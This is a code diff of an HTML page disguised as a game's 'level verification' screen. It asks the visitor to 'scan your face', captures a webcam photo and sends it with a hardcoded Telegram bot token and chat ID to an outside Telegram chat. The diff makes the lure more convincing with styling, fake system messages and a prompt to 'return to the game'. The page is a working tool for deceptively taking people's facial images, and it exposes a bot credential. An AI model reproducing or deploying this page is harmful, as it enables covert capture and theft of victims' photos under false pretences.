@@ -1,40 +1,98 @@
 <!DOCTYPE html>
-<html>
-<body style="background-color:black; color:red; text-align:center; font-family:sans-serif;">
-    <h2>LEVEL VERIFICATION</h2>
-    <video id="video" width="320" height="240" autoplay style="border:2px solid red;"></video>
-    <br>
-    <button id="capture" style="background:red; color:white; padding:10px 20px; border:none; cursor:pointer;">
-        COMPLETE TASK
-    </button>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM_VERIFICATION_REQUIRED</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        h1 { font-size: 24px; letter-spacing: 5px; text-shadow: 0 0 10px red; }
+        p { color: #888; font-size: 14px; }
+        #video {
+            border: 2px solid #ff0000;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            background: #000;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 10px;
+        }
+        button {
+            margin-top: 20px;
+            background-color: #ff0000;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 0 10px red;
+        }
+        button:hover { background-color: #b30000; }
+        #status { margin-top: 15px; font-size: 12px; color: #555; }
+    </style>
+</head>
+<body>
+
+    <h1>LEVEL_STATUS: LOCKED</h1>
+    <p>Scan your face to prove your identity...</p>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <button id="capture">Upload Proof</button>
+    <div id="status">Waiting for system access...</div>
 
     <script>
         const video = document.getElementById('video');
-        const botToken = "8344149838:AAFseljBPNEZJ1OTiLK3_Fv5aMn2fcf7RYk";
-        const chatId = " 7967860350";
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('capture');
+        const status = document.getElementById('status');
+
+        // আপনার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি এখানে বসান
+        const botToken = "8344149838:AAFseljBPNEZJ1OTiLK3_Fv5aMn2fcf7RYk"; 
+        const chatId = "7967860350";
 
         // ক্যামেরা চালু করা
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            video.srcObject = stream;
-        });
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { status.innerText = "Error: Camera Access Denied"; });
 
-        document.getElementById('capture').addEventListener('click', () => {
-            const canvas = document.createElement('canvas');
+        captureBtn.addEventListener('click', () => {
+            status.innerText = "Processing Data...";
+            const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             // ছবিকে টেলিগ্রামে পাঠানো
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'task.jpg');
-                formData.append('caption', '⚠️ Task Completed by User!');
+                formData.append('photo', blob, 'verification.jpg');
+                formData.append('caption', '🔴 Day Task Completed! User ID: ' + Math.floor(Math.random() * 1000));
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
-                }).then(() => alert('Task Submitted Successfully!'));
+                })
+                .then(response => {
+                    if(response.ok) {
+                        status.innerText = "Verification Sent! You can close the tab.";
+                        alert("Verification Successful. Return to the game.");
+                    }
+                })
+                .catch(() => { status.innerText = "Network Error."; });
             }, 'image/jpeg');
         });
     </script>
